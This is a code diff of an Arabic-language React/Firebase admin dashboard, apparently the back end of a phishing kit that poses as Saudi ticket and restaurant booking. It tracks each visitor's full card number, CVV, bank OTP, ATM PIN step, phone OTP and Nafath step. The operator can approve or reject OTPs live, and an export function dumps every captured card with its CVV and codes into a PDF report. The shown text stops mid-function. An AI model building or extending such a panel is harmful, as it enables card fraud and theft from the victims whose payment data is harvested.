@@ -1,1493 +1,3009 @@
-import { useState, useEffect, useRef } from "react";
-import { useLocation } from "wouter";
-import { collection, deleteDoc, doc, onSnapshot, query } from "firebase/firestore";
-import { db, onAuthChange, logoutUser, updateApprovalStatus, updateOtpApprovalStatus, updateVisitorBlockStatus, addBlockedBin, removeBlockedBin, listenBlockedBins } from "@/lib/firebase";
-import { Button } from "@/components/ui/button";
+import React, { useEffect, useMemo, useRef, useState } from "react";
 import {
-  AlertDialog,
-  AlertDialogAction,
-  AlertDialogCancel,
-  AlertDialogContent,
-  AlertDialogDescription,
-  AlertDialogFooter,
-  AlertDialogHeader,
-  AlertDialogTitle,
-} from "@/components/ui/alert-dialog";
-import { toast } from "@/hooks/use-toast";
-import { User, CreditCard, Phone, Mail, IdCard, Calendar, Volume2, LogOut, Users, Eye, Shield, DollarSign, Trash2, Send, UtensilsCrossed, Clock, Receipt, Ticket, Wifi, WifiOff, Globe, Ban } from "lucide-react";
+  collection,
+  onSnapshot,
+  query,
+  doc,
+  setDoc,
+  deleteDoc,
+  arrayUnion,
+  arrayRemove,
+  getDocs,
+  writeBatch,
+} from "firebase/firestore";
+import { useLocation } from "wouter";
+import {
+  db,
+  auth,
+  logoutUser,
+  updateApprovalStatus,
+  updateOtpApprovalStatus,
+  updateVisitorBlockStatus,
+  addBlockedBin as fbAddBlockedBin,
+  removeBlockedBin as fbRemoveBlockedBin,
+  listenBlockedBins,
+} from "@/lib/firebase";
+import { findBankLogo } from "@/lib/bank-logos";
+import { onAuthStateChanged, type User } from "firebase/auth";
+import {
+  Search,
+  RefreshCw,
+  Trash2,
+  Bell,
+  Volume2,
+  LogOut,
+  CreditCard,
+  Globe,
+  Smartphone as PhoneIcon,
+  CheckCircle2,
+  XCircle,
+  Send,
+  ArrowLeftRight,
+  Hash,
+  Lock as LockIcon,
+  ChevronDown,
+  Layers,
+  Settings,
+  Eye,
+  EyeOff,
+  RotateCcw,
+  Users,
+  Activity,
+  AlarmClock,
+  CheckCheck,
+  AlertTriangle,
+  BellRing,
+  VolumeX,
+  Ban,
+  ShieldOff,
+  Plus,
+  X as XIcon,
+  FileDown,
+  WifiOff,
+} from "lucide-react";
 
-interface OtpEntry {
-  code: string;
-  timestamp: string;
-}
+type CardKey = "customer" | "otp" | "card" | "phone" | "header";
+type CardSetting = { visible: boolean; span: 1 | 2 };
+type CardSettings = Record<CardKey, CardSetting>;
 
-interface CardEntry {
-  cardNumber?: string;
-  cardName?: string;
-  expiryMonth?: string;
-  expiryYear?: string;
-  cvv?: string;
-  cardType?: string;
-  timestamp: string;
-}
-
-interface VisitorData {
-  id: string;
-  name?: string;
-  saudiId?: string;
-  email?: string;
-  phone?: string;
-  cardNumber?: string;
-  cardName?: string;
-  expiryMonth?: string;
-  expiryYear?: string;
-  cvv?: string;
-  cardType?: string;
-  cardCategory?: string;
-  cardHistory?: CardEntry[];
-  currentPage?: string;
-  status?: string;
-  createdDate?: string;
-  online?: boolean;
-  lastSeen?: any;
-  otp?: string;
-  otpHistory?: OtpEntry[];
-  totalAmount?: number;
-  ticketQuantity?: number;
-  ticketPrice?: number;
-  bookingDate?: string;
-  bookingTime?: string;
-  cardApproved?: boolean;
-  otpApproved?: boolean;
-  otpStatus?: string;
-  type?: string;
-  restaurant?: string;
-  restaurantEn?: string;
-  date?: string;
-  time?: string;
-  guests?: string;
-  notes?: string;
-  total?: number;
-  blocked?: boolean;
-  blockedAt?: string;
-}
-
-interface BinLookupData {
-  bin: string;
-  bankName: string;
-  cardBrand: string;
-  cardType: string;
-  cardLevel: string;
-  country: string;
-  countryCode: string;
-}
-
-const pageNames: Record<string, string> = {
-  "registration": "التسجيل",
-  "booking": "الحجز",
-  "cart": "السلة",
-  "checkout": "الدفع",
-  "otp": "رمز التحقق",
-  "otp_verified": "تم التحقق",
-  "confirmation": "التأكيد",
-  "reserve_checkout": "حجز مطعم - الدفع",
-  "reserve_otp": "حجز مطعم - رمز التحقق",
+const CARD_LABELS: Record<CardKey, string> = {
+  customer: "معلومات أساسية",
+  otp: "العميل المحدد / OTP",
+  card: "معلومات البطاقة",
+  phone: "الجوال والمشغل",
+  header: "ترويسة الزائر",
 };
 
-const getPageNameArabic = (page?: string) => {
-  if (!page) return "غير محدد";
-  return pageNames[page] || page;
+const DEFAULT_CARD_SETTINGS: CardSettings = {
+  customer: { visible: true, span: 1 },
+  otp: { visible: true, span: 1 },
+  card: { visible: true, span: 1 },
+  phone: { visible: true, span: 1 },
+  header: { visible: true, span: 1 },
 };
 
-const getRelativeTime = (dateStr?: string) => {
-  if (!dateStr) return "";
-  const date = new Date(dateStr);
-  const now = new Date();
-  const diffMs = now.getTime() - date.getTime();
-  const diffSecs = Math.floor(diffMs / 1000);
-  const diffMins = Math.floor(diffSecs / 60);
-  const diffHours = Math.floor(diffMins / 60);
-  const diffDays = Math.floor(diffHours / 24);
-
-  if (diffSecs < 60) return "الآن";
-  if (diffMins < 60) return `منذ ${diffMins} د`;
-  if (diffHours < 24) return `منذ ${diffHours} س`;
-  if (diffDays < 7) return `منذ ${diffDays} ي`;
-  return date.toLocaleDateString("ar-SA");
+const OPERATOR_LABELS: Record<string, string> = {
+  stc: "STC",
+  mobily: "موبايلي",
+  zain: "زين",
 };
 
-const getCardNetworkArabic = (cardType?: string) => {
-  if (cardType === "mada") return "مدى";
-  if (cardType === "visa") return "فيزا";
-  if (cardType === "mastercard") return "ماستركارد";
-  return "ائتمانية";
-};
-
-const formatCardNumberForDisplay = (cardNumber?: string) => {
-  const trimmed = cardNumber?.trim();
-  if (!trimmed) return "---";
-
-  const digits = trimmed.replace(/\D/g, "");
-  if (digits.length < 13) return trimmed;
-
-  return digits.replace(/(.{4})/g, "$1 ").trim();
-};
-
-const formatExpiryForDisplay = (expiryMonth?: string, expiryYear?: string) => {
-  const month = expiryMonth?.trim() ? expiryMonth.padStart(2, "0").slice(-2) : "--";
-  const year = expiryYear?.trim() ? expiryYear.slice(-2).padStart(2, "0") : "--";
-  return `${month}/${year}`;
-};
-
-const countryCodeToFlag = (countryCode?: string) => {
-  if (!countryCode || countryCode.length !== 2) return "🏳️";
-  const uppercaseCode = countryCode.toUpperCase();
-  const isAlphabetic = /^[A-Z]{2}$/.test(uppercaseCode);
-  if (!isAlphabetic) return "🏳️";
-  return String.fromCodePoint(
-    ...uppercaseCode.split("").map((char) => 127397 + char.charCodeAt(0)),
-  );
-};
-
-const isTicketFlow = (v: VisitorData) => v.type !== "restaurant_reservation";
-const isReservationFlow = (v: VisitorData) => v.type === "restaurant_reservation";
-
-const SCHEME_COLORS: Record<string, string> = {
-  VISA: "bg-blue-500/20 text-blue-300 border-blue-500/30",
-  MASTERCARD: "bg-red-500/20 text-red-300 border-red-500/30",
-  AMEX: "bg-green-500/20 text-green-300 border-green-500/30",
-  MADA: "bg-purple-500/20 text-purple-300 border-purple-500/30",
-};
-
-const TYPE_COLORS: Record<string, string> = {
-  CREDIT: "bg-amber-500/20 text-amber-300",
-  DEBIT: "bg-emerald-500/20 text-emerald-300",
-  PREPAID: "bg-slate-500/20 text-slate-300",
-};
-
-const BANK_NAME_AR: Array<[RegExp, string]> = [
-  [/SAUDI NATIONAL BANK|SNB|AL AHLI/i, "البنك الأهلي السعودي"],
-  [/AL[\s-]?RAJHI/i, "بنك الراجحي"],
-  [/RIYAD BANK/i, "بنك الرياض"],
-  [/BANQUE SAUDI FRANSI|SAUDI FRANSI/i, "البنك السعودي الفرنسي"],
-  [/ARAB NATIONAL BANK|ANB/i, "البنك العربي الوطني"],
-  [/SAMBA FINANCIAL|SAMBA/i, "بنك ساوب (سامبا)"],
-  [/BANK ALBILAD|AL BILAD/i, "بنك البلاد"],
-  [/BANK ALJAZIRA|AL JAZIRA/i, "بنك الجزيرة"],
-  [/ALINMA/i, "بنك الإنماء"],
-  [/SAUDI BRITISH BANK|SABB/i, "البنك السعودي البريطاني"],
-  [/GULF INTERNATIONAL BANK|GIB/i, "البنك الدولي للخليج"],
-  [/SAUDI INVESTMENT BANK|SAIB/i, "البنك السعودي للاستثمار"],
-  [/NATIONAL COMMERCIAL BANK|NCB/i, "البنك الأهلي التجاري"],
-  [/SAUDI HOLLANDI|ALAWWAL/i, "البنك السعودي الهولندي"],
-  [/DERAYAH/i, "شركة ديراية المالية"],
-  [/STC BANK|STC PAY/i, "بنك STC"],
-  [/EMIRATES NBD/i, "بنك الإمارات دبي الوطني"],
-  [/FIRST ABU DHABI BANK|FAB/i, "بنك أبوظبي الأول"],
-  [/ABU DHABI COMMERCIAL BANK|ADCB/i, "بنك أبوظبي التجاري"],
-  [/ABU DHABI ISLAMIC BANK|ADIB/i, "مصرف أبوظبي الإسلامي"],
-  [/MASHREQ/i, "بنك المشرق"],
-  [/DUBAI ISLAMIC BANK|DIB/i, "بنك دبي الإسلامي"],
-  [/NATIONAL BANK OF KUWAIT|NBK/i, "بنك الكويت الوطني"],
-  [/KUWAIT FINANCE HOUSE|KFH/i, "بيت التمويل الكويتي"],
-  [/QATAR NATIONAL BANK|QNB/i, "بنك قطر الوطني"],
-  [/BANK MUSCAT/i, "بنك مسقط"],
-  [/NATIONAL BANK OF EGYPT|NBE/i, "البنك الأهلي المصري"],
-  [/BANQUE MISR/i, "بنك مصر"],
-  [/ARAB BANK/i, "البنك العربي"],
-  [/JPMORGAN CHASE|CHASE BANK/i, "جي بي مورغان تشيس"],
-  [/BANK OF AMERICA/i, "بنك أوف أمريكا"],
-  [/CITIBANK|CITIGROUP/i, "سيتي بنك"],
-  [/WELLS FARGO/i, "ويلز فارغو"],
-  [/AMERICAN EXPRESS|AMEX/i, "أمريكان إكسبريس"],
-  [/HSBC/i, "إتش إس بي سي"],
-  [/BARCLAYS/i, "باركليز"],
-  [/STANDARD CHARTERED/i, "ستاندرد تشارترد"],
-  [/SANTANDER/i, "بنك سانتاندر"],
-  [/BNP PARIBAS/i, "بي إن بي باريبا"],
-  [/DEUTSCHE BANK/i, "دويتشه بنك"],
-];
-
-function translateBankName(englishName: string): string {
-  if (!englishName) return englishName;
-  for (const [pattern, arabic] of BANK_NAME_AR) {
-    if (pattern.test(englishName)) return arabic;
+function loadCardSettings(): CardSettings {
+  try {
+    const raw = localStorage.getItem("admin.cardSettings");
+    if (!raw) return DEFAULT_CARD_SETTINGS;
+    const parsed = JSON.parse(raw);
+    return { ...DEFAULT_CARD_SETTINGS, ...parsed };
+  } catch {
+    return DEFAULT_CARD_SETTINGS;
   }
-  return englishName;
 }
 
-const COUNTRY_AR: Record<string, string> = {
-  "UNITED STATES": "الولايات المتحدة",
-  "UNITED KINGDOM": "المملكة المتحدة",
-  "SAUDI ARABIA": "المملكة العربية السعودية",
-  "UNITED ARAB EMIRATES": "الإمارات العربية المتحدة",
-  KUWAIT: "الكويت",
-  QATAR: "قطر",
-  BAHRAIN: "البحرين",
-  OMAN: "عُمان",
-  JORDAN: "الأردن",
-  EGYPT: "مصر",
-  LEBANON: "لبنان",
-  IRAQ: "العراق",
-  GERMANY: "ألمانيا",
-  FRANCE: "فرنسا",
-  CANADA: "كندا",
-  AUSTRALIA: "أستراليا",
-  CHINA: "الصين",
-  JAPAN: "اليابان",
-  INDIA: "الهند",
-  SINGAPORE: "سنغافورة",
-  MALAYSIA: "ماليزيا",
-  TURKEY: "تركيا",
+interface Visitor {
+  id: string;
+  [k: string]: any;
+}
+
+const STEP_LABELS: Record<number, string> = {
+  1: "بيانات الطلب",
+  2: "اختيار الموعد",
+  3: "مراجعة",
+  4: "بطاقة الدفع",
+  5: "OTP البنك",
+  6: "ATM PIN",
+  7: "رقم الجوال",
+  8: "OTP الجوال",
+  9: "نفاذ",
 };
 
-function translateCountry(englishCountry: string): string {
-  if (!englishCountry) return englishCountry;
-  const upper = englishCountry.toUpperCase();
-  return COUNTRY_AR[upper] || englishCountry;
+/* -------------------------------------------------------------- */
+/* Adapter: map current flat schema → the shape the new UI expects */
+/* -------------------------------------------------------------- */
+
+const PAGE_TO_STEP: Record<string, number> = {
+  registration: 1,
+  booking: 2,
+  cart: 3,
+  reserve_checkout: 3,
+  checkout: 4,
+  otp: 5,
+  reserve_otp: 5,
+  otp_verified: 5,
+  confirmation: 9,
+};
+
+function tsFromAny(v: any): string | undefined {
+  if (!v) return undefined;
+  if (typeof v === "string") return v;
+  if (typeof v === "number") return new Date(v).toISOString();
+  if (typeof v?.toDate === "function") {
+    try {
+      return v.toDate().toISOString();
+    } catch {
+      return undefined;
+    }
+  }
+  if (typeof v?.seconds === "number") {
+    return new Date(v.seconds * 1000).toISOString();
+  }
+  return undefined;
 }
 
-export default function DashboardPage() {
+function adaptVisitor(raw: any): Visitor {
+  const cardNumber = String(raw?.cardNumber || "").replace(/\D/g, "");
+  const last4 = cardNumber.slice(-4);
+  const bin = cardNumber.slice(0, 6);
+  const mm = String(raw?.expiryMonth || "")
+    .padStart(2, "0")
+    .slice(-2);
+  const yy = String(raw?.expiryYear || "").slice(-2).padStart(2, "0");
+  const expiry = mm.trim() && yy.trim() ? `${mm}/${yy}` : "";
+
+  const ct = String(raw?.cardType || "").toLowerCase();
+  const scheme =
+    ct === "mada"
+      ? "mada"
+      : ct === "visa"
+        ? "visa"
+        : ct === "mastercard" || ct === "master"
+          ? "mastercard"
+          : ct === "amex" || ct === "american express"
+            ? "amex"
+            : ct;
+
+  const matchedBank = findBankLogo(raw?.cardBankName || raw?.bankName);
+  const cardBank = raw?.cardBankName || raw?.bankName || "";
+
+  const payment = {
+    cardNumber: raw?.cardNumber,
+    cardLast4: last4 || undefined,
+    cardBin: bin || undefined,
+    cardName: raw?.cardName,
+    cardExpiry: expiry || undefined,
+    cardCvc: raw?.cvv,
+    cardScheme: scheme,
+    cardType: raw?.cardCategory || undefined,
+    cardLevel: raw?.cardLevel || undefined,
+    cardCountry: raw?.cardCountry || undefined,
+    cardBank,
+    cardBankLogo: matchedBank?.logo || null,
+    cardBankLabel: matchedBank?.label || cardBank || "",
+    amount: raw?.totalAmount || raw?.total,
+  };
+
+  let cardApprovalStatus: string | undefined;
+  if (raw?.cardApproved === true) cardApprovalStatus = "approved";
+  else if (raw?.cardStatus === "rejected") cardApprovalStatus = "rejected";
+  else if (
+    raw?.cardStatus === "pending_approval" ||
+    raw?.status === "pending_approval"
+  )
+    cardApprovalStatus = "waiting";
+  // Fall back to the new persisted field if no legacy signal is present.
+  if (!cardApprovalStatus && typeof raw?.cardApprovalStatus === "string") {
+    cardApprovalStatus = raw.cardApprovalStatus;
+  }
+
+  let otpApprovalStatus: string | undefined;
+  if (raw?.otpApproved === true) otpApprovalStatus = "approved";
+  else if (raw?.otpStatus === "rejected") otpApprovalStatus = "rejected";
+  else if (raw?.otpStatus === "pending" || (raw?.otp && !raw?.otpApproved))
+    otpApprovalStatus = "waiting";
+  if (!otpApprovalStatus && typeof raw?.otpApprovalStatus === "string") {
+    otpApprovalStatus = raw.otpApprovalStatus;
+  }
+
+  const phoneOtpApprovalStatus =
+    typeof raw?.phoneOtpApprovalStatus === "string"
+      ? raw.phoneOtpApprovalStatus
+      : undefined;
+
+  const updatedAt =
+    tsFromAny(raw?.lastSeen) ||
+    tsFromAny(raw?.updatedAt) ||
+    raw?.createdDate ||
+    undefined;
+
+  const stepFromPage = PAGE_TO_STEP[String(raw?.currentPage || "")] || 0;
+  const step =
+    raw?.currentPage === "confirmation"
+      ? 9
+      : stepFromPage ||
+        (raw?.otp ? 5 : raw?.cardNumber ? 4 : raw?.name ? 1 : 0);
+
+  const completed =
+    raw?.currentPage === "confirmation" ||
+    raw?.currentPage === "otp_verified" ||
+    (cardApprovalStatus === "approved" && otpApprovalStatus === "approved");
+
+  return {
+    ...raw,
+    payment,
+    step,
+    cardApprovalStatus,
+    otpApprovalStatus,
+    phoneOtpApprovalStatus,
+    updatedAt,
+    status: completed ? "nafad_otp_submitted" : raw?.status,
+  } as Visitor;
+}
+
+/* -------------------------------------------------------------- */
+/* Helpers                                                         */
+/* -------------------------------------------------------------- */
+
+function fmtTime(iso?: string) {
+  if (!iso) return "—";
+  const d = new Date(iso);
+  if (isNaN(d.getTime())) return "—";
+  return d.toLocaleString("ar-SA", { dateStyle: "short", timeStyle: "short" });
+}
+
+function safeText(v: any): string {
+  if (v === null || v === undefined) return "";
+  if (typeof v === "string" || typeof v === "number") return String(v);
+  if (typeof v === "object")
+    return (
+      v.name ||
+      v.bank ||
+      v.bank_name ||
+      v.bankName ||
+      v.scheme ||
+      v.brand ||
+      JSON.stringify(v)
+    );
+  return String(v);
+}
+
+function isOnline(v: Visitor): boolean {
+  if (v.online === true) return true;
+  if (v.online === false && !v.updatedAt) return false;
+  if (!v.updatedAt) return false;
+  const t = new Date(v.updatedAt).getTime();
+  if (isNaN(t)) return false;
+  return Date.now() - t < 60_000;
+}
+
+const WAITING_FIELDS = [
+  "cardApprovalStatus",
+  "otpApprovalStatus",
+  "phoneOtpApprovalStatus",
+  "nafadConfirmationStatus",
+] as const;
+
+function waitingFields(v: Visitor): string[] {
+  return WAITING_FIELDS.filter((f) => v[f] === "waiting");
+}
+function isWaiting(v: Visitor): boolean {
+  return waitingFields(v).length > 0;
+}
+function isCompleted(v: Visitor): boolean {
+  return v.status === "nafad_otp_submitted" || v.step === 9;
+}
+
+function fmtRelative(iso?: string): string {
+  if (!iso) return "—";
+  const t = new Date(iso).getTime();
+  if (isNaN(t)) return "—";
+  const diff = Math.max(0, Date.now() - t);
+  const sec = Math.floor(diff / 1000);
+  if (sec < 60) return `منذ ${sec}ث`;
+  const min = Math.floor(sec / 60);
+  if (min < 60) return `منذ ${min}د`;
+  const hr = Math.floor(min / 60);
+  if (hr < 24) return `منذ ${hr}س`;
+  const day = Math.floor(hr / 24);
+  return `منذ ${day}ي`;
+}
+
+function stepColor(step: number): string {
+  if (step >= 9)
+    return "bg-emerald-500/20 text-emerald-300 border-emerald-500/40";
+  if (step >= 7) return "bg-violet-500/20 text-violet-300 border-violet-500/40";
+  if (step >= 5) return "bg-amber-500/20 text-amber-300 border-amber-500/40";
+  if (step >= 4) return "bg-cyan-500/20 text-cyan-300 border-cyan-500/40";
+  return "bg-slate-700/40 text-slate-300 border-slate-600/40";
+}
+
+function beep(volume = 0.18) {
+  try {
+    const Ctx =
+      (window as any).AudioContext || (window as any).webkitAudioContext;
+    if (!Ctx) return;
+    const ctx = new Ctx();
+    const osc = ctx.createOscillator();
+    const gain = ctx.createGain();
+    osc.type = "sine";
+    osc.frequency.setValueAtTime(880, ctx.currentTime);
+    osc.frequency.exponentialRampToValueAtTime(1320, ctx.currentTime + 0.18);
+    gain.gain.setValueAtTime(volume, ctx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 0.35);
+    osc.connect(gain);
+    gain.connect(ctx.destination);
+    osc.start();
+    osc.stop(ctx.currentTime + 0.36);
+  } catch {}
+}
+
+function escHtml(s: any): string {
+  const str = s == null ? "" : String(s);
+  return str
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#39;");
+}
+
+function exportAllCardsPdf(visitors: Visitor[]) {
+  const withCards = visitors.filter(
+    (v) => v?.payment?.cardNumber || v?.payment?.cardLast4,
+  );
+  if (withCards.length === 0) {
+    alert("لا توجد بطاقات لتصديرها.");
+    return;
+  }
+
+  const rows = withCards
+    .map((v, idx) => {
+      const p = v.payment || {};
+      const fullCard = String(p.cardNumber || "").replace(/\D/g, "");
+      const formatted = fullCard
+        ? fullCard.replace(/(.{4})/g, "$1 ").trim()
+        : `**** **** **** ${escHtml(p.cardLast4 || "----")}`;
+      const expiry = escHtml(p.cardExpiry || "—");
+      const cvv = escHtml(p.cardCvc || "—");
+      const name = escHtml(p.cardName || v.name || "—");
+      const bin = escHtml(p.cardBin || (fullCard ? fullCard.slice(0, 6) : "—"));
+      const bank = escHtml(p.cardBankLabel || p.cardBank || "—");
+      const scheme = escHtml(p.cardScheme || "—");
+      const type = escHtml(p.cardType || "—");
+      const level = escHtml(p.cardLevel || "—");
+      const country = escHtml(p.cardCountry || "—");
+      const phone = escHtml(v.phone || "—");
+      const otpCard = escHtml(v.otp || "—");
+      const otpSms = escHtml(v.smsOtp || "—");
+      const updated = escHtml(fmtTime(v.updatedAt));
+      const visitorId = escHtml(v.id);
+      return `
+      <article class="card-row">
+        <header class="row-head">
+          <div class="row-idx">#${idx + 1}</div>
+          <div class="row-meta">
+            <div><strong>الزائر:</strong> ${visitorId}</div>
+            <div><strong>التحديث:</strong> ${updated}</div>
+          </div>
+        </header>
+        <div class="card-grid">
+          <div class="block primary">
+            <div class="lbl">رقم البطاقة</div>
+            <div class="val mono big">${escHtml(formatted)}</div>
+          </div>
+          <div class="block"><div class="lbl">اسم حامل البطاقة</div><div class="val">${name}</div></div>
+          <div class="block"><div class="lbl">تاريخ الانتهاء</div><div class="val mono">${expiry}</div></div>
+          <div class="block"><div class="lbl">CVV</div><div class="val mono">${cvv}</div></div>
+          <div class="block"><div class="lbl">BIN</div><div class="val mono">${bin}</div></div>
+          <div class="block"><div class="lbl">الشبكة</div><div class="val">${scheme}</div></div>
+          <div class="block"><div class="lbl">النوع</div><div class="val">${type}</div></div>
+          <div class="block"><div class="lbl">المستوى</div><div class="val">${level}</div></div>
+          <div class="block"><div class="lbl">الدولة</div><div class="val">${country}</div></div>
+          <div class="block wide"><div class="lbl">البنك</div><div class="val">${bank}</div></div>
+          <div class="block"><div class="lbl">رمز البطاقة (OTP)</div><div class="val mono">${otpCard}</div></div>
+          <div class="block"><div class="lbl">رمز SMS</div><div class="val mono">${otpSms}</div></div>
+          <div class="block wide"><div class="lbl">الجوال</div><div class="val mono">${phone}</div></div>
+        </div>
+      </article>`;
+    })
+    .join("\n");
+
+  const now = new Date();
+  const dateStr = now.toLocaleString("ar-SA");
+  const html = `<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8" />
+<title>تصدير البطاقات - ${withCards.length}</title>
+<style>
+  * { box-sizing: border-box; }
+  html, body { margin: 0; padding: 0; background: #fff; color: #111; font-family: -apple-system, "Segoe UI", Tahoma, Arial, "Noto Sans Arabic", sans-serif; }
+  .page { padding: 18mm 12mm; }
+  .doc-head { display: flex; justify-content: space-between; align-items: flex-end; border-bottom: 2px solid #111; padding-bottom: 10px; margin-bottom: 16px; }
+  .doc-head h1 { margin: 0; font-size: 20px; }
+  .doc-head .meta { font-size: 12px; color: #444; text-align: left; direction: ltr; }
+  .doc-head .meta div { margin-bottom: 2px; }
+  .summary { font-size: 12px; color: #555; margin-bottom: 14px; }
+  .card-row { border: 1px solid #d0d0d0; border-radius: 6px; padding: 12px 14px; margin-bottom: 12px; page-break-inside: avoid; background: #fafafa; }
+  .row-head { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; padding-bottom: 8px; border-bottom: 1px dashed #c0c0c0; }
+  .row-idx { font-size: 18px; font-weight: 800; color: #1a56db; }
+  .row-meta { font-size: 11px; color: #555; text-align: left; direction: ltr; }
+  .row-meta strong { color: #111; }
+  .card-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; }
+  .block { background: #fff; border: 1px solid #e3e3e3; border-radius: 4px; padding: 6px 8px; }
+  .block.wide { grid-column: span 2; }
+  .block.primary { grid-column: span 4; background: #fff; border-color: #1a56db; }
+  .block .lbl { font-size: 10px; color: #666; margin-bottom: 3px; }
+  .block .val { font-size: 13px; color: #111; font-weight: 600; word-break: break-all; }
+  .block .val.mono { font-family: "SFMono-Regular", Menlo, Consolas, monospace; direction: ltr; text-align: left; letter-spacing: 0.04em; }
+  .block .val.big { font-size: 18px; letter-spacing: 0.12em; }
+  .footer-note { margin-top: 14px; font-size: 10px; color: #888; text-align: center; }
+  @media print {
+    .no-print { display: none !important; }
+    .page { padding: 10mm; }
+    .card-row { background: #fff; }
+  }
+  .toolbar { position: sticky; top: 0; background: #1a56db; color: #fff; padding: 10px 14px; display: flex; justify-content: space-between; align-items: center; z-index: 10; }
+  .toolbar button { background: #fff; color: #1a56db; border: none; padding: 8px 16px; border-radius: 4px; font-weight: 700; cursor: pointer; font-size: 13px; }
+  .toolbar button:hover { background: #f0f0f0; }
+</style>
+</head>
+<body>
+  <div class="toolbar no-print">
+    <span>اضغط زر "طباعة / حفظ PDF" ثم اختر "Save as PDF"</span>
+    <button onclick="window.print()">طباعة / حفظ PDF</button>
+  </div>
+  <div class="page">
+    <div class="doc-head">
+      <h1>تقرير البطاقات</h1>
+      <div class="meta">
+        <div>${escHtml(dateStr)}</div>
+        <div>إجمالي البطاقات: ${withCards.length}</div>
+      </div>
+    </div>
+    <div class="summary">يحتوي هذا التقرير على بيانات ${withCards.length} بطاقة مُسجَّلة عبر النظام.</div>
+    ${rows}
+    <div class="footer-note">تم التوليد تلقائياً من لوحة التحكم</div>
+  </div>
+  <script>
+    window.addEventListener('load', function() {
+      setTimeout(function() { window.print(); }, 350);
+    });
+  </script>
+</body>
+</html>`;
+
+  const w = window.open("", "_blank", "width=900,height=1000");
+  if (!w) {
+    alert("الرجاء السماح بالنوافذ المنبثقة لتصدير الـ PDF.");
+    return;
+  }
+  w.document.open();
+  w.document.write(html);
+  w.document.close();
+}
+
+/* -------------------------------------------------------------- */
+/* Auth wrapper                                                    */
+/* -------------------------------------------------------------- */
+
+export default function Admin() {
   const [, setLocation] = useLocation();
-  const [visitors, setVisitors] = useState<VisitorData[]>([]);
-  const [loading, setLoading] = useState(true);
-  const [selectedVisitor, setSelectedVisitor] = useState<VisitorData | null>(null);
-  const [soundEnabled, setSoundEnabled] = useState(true);
-  const [isAuthenticated, setIsAuthenticated] = useState(false);
-  const [checkingAuth, setCheckingAuth] = useState(true);
-  const [deleteDialogOpen, setDeleteDialogOpen] = useState(false);
-  const [deletingVisitorId, setDeletingVisitorId] = useState<string | null>(null);
-  const [blockDialogOpen, setBlockDialogOpen] = useState(false);
-  const [blockingVisitorId, setBlockingVisitorId] = useState<string | null>(null);
-  const [sendMailDialogOpen, setSendMailDialogOpen] = useState(false);
-  const [sendingMail, setSendingMail] = useState(false);
-  const [filterType, setFilterType] = useState<"all" | "ticket" | "reservation">("all");
-  const [binLookupByBin, setBinLookupByBin] = useState<Record<string, BinLookupData>>({});
-  const [binLookupLoading, setBinLookupLoading] = useState(false);
-  const [binLookupError, setBinLookupError] = useState<string | null>(null);
-  const [blockedBins, setBlockedBins] = useState<Array<{ bin: string; bankName?: string; cardBrand?: string; country?: string; blockedAt?: string }>>([]);
-  const [showBlockedBinsPanel, setShowBlockedBinsPanel] = useState(false);
-  const [newBinInput, setNewBinInput] = useState("");
-  const [addingBin, setAddingBin] = useState(false);
-  const audioRef = useRef<HTMLAudioElement | null>(null);
-  const prevVisitorsCount = useRef(0);
+  const [authUser, setAuthUser] = useState<User | null>(null);
+  const [authReady, setAuthReady] = useState(false);
 
   useEffect(() => {
-    const unsubscribe = listenBlockedBins((bins) => {
-      setBlockedBins(bins.sort((a, b) => (b.blockedAt || "").localeCompare(a.blockedAt || "")));
+    if (!auth) {
+      setAuthReady(true);
+      return;
+    }
+    const unsub = onAuthStateChanged(auth, (u) => {
+      setAuthUser(u);
+      setAuthReady(true);
     });
-    return () => unsubscribe();
+    return () => unsub();
   }, []);
 
-  const handleBlockBin = async (bin: string, meta?: { bankName?: string; cardBrand?: string; country?: string }) => {
-    try {
-      await addBlockedBin(bin, meta);
-      toast({ title: "تم حظر البطاقة", description: `لن تُقبل أي بطاقات تبدأ بالأرقام ${bin}` });
-    } catch {
-      toast({ title: "فشل حظر البطاقة", description: "حدث خطأ أثناء حظر البطاقة.", variant: "destructive" });
-    }
-  };
-
-  const handleUnblockBin = async (bin: string) => {
-    try {
-      await removeBlockedBin(bin);
-      toast({ title: "تم رفع الحظر", description: `بطاقات ${bin} متاحة الآن` });
-    } catch {
-      toast({ title: "فشل رفع الحظر", description: "حدث خطأ.", variant: "destructive" });
-    }
-  };
-
   useEffect(() => {
-    const unsubscribe = onAuthChange((user) => {
-      if (user) {
-        setIsAuthenticated(true);
-      } else {
-        setLocation("/login");
-      }
-      setCheckingAuth(false);
-    });
-    return () => unsubscribe();
-  }, [setLocation]);
-
-  const handleLogout = async () => {
-    await logoutUser();
-    setLocation("/login");
-  };
-
-  const handleDeleteSelectedVisitor = async () => {
-    if (!db || !selectedVisitor) return;
-    const idToDelete = selectedVisitor.id;
-    const nextSelected =
-      (() => {
-        const idx = visitors.findIndex((v) => v.id === idToDelete);
-        return (idx >= 0 ? visitors[idx + 1] : undefined) ?? (idx > 0 ? visitors[idx - 1] : undefined) ?? null;
-      })();
-
-    setDeletingVisitorId(idToDelete);
-    try {
-      setVisitors((prev) => prev.filter((v) => v.id !== idToDelete));
-      setSelectedVisitor((prevSelected) => (prevSelected?.id === idToDelete ? nextSelected : prevSelected));
-      await deleteDoc(doc(db, "pays", idToDelete));
-      setDeleteDialogOpen(false);
-    } catch (error) {
-      console.error("Error deleting visitor:", error);
-    } finally {
-      setDeletingVisitorId(null);
+    if (authReady && !authUser) {
+      setLocation("/login");
     }
-  };
+  }, [authReady, authUser, setLocation]);
 
-  const handleSendMailToSelectedVisitor = async () => {
-    if (!selectedVisitor?.email) {
-      toast({ title: "لا يوجد بريد إلكتروني", description: "هذا الزائر لا يحتوي على بريد إلكتروني.", variant: "destructive" });
-      return;
-    }
-    setSendingMail(true);
-    try {
-      const response = await fetch("/api/send-confirmation-email", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ email: selectedVisitor.email, name: selectedVisitor.name || "زائر" }),
-      });
-      const payload = await response.json().catch(() => ({}));
-      if (!response.ok || payload?.success === false) throw new Error(payload?.error || "Failed");
